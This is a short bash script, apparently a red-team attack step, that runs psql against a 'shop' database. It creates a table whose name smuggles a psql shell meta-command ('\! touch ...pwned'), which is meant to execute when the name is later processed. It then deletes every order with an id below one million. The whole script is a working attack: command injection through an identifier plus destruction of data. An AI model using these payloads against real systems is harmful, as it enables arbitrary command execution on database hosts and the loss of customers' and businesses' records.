#!/bin/bash
. /opt/rt/work/target.env
psql -X -q -d shop -c 'CREATE TABLE IF NOT EXISTS "orders \! touch /tmp/rt-l4-pgmeta-pwned" (id int)'
psql -X -q -d shop -c "DELETE FROM orders WHERE id < 1000000"
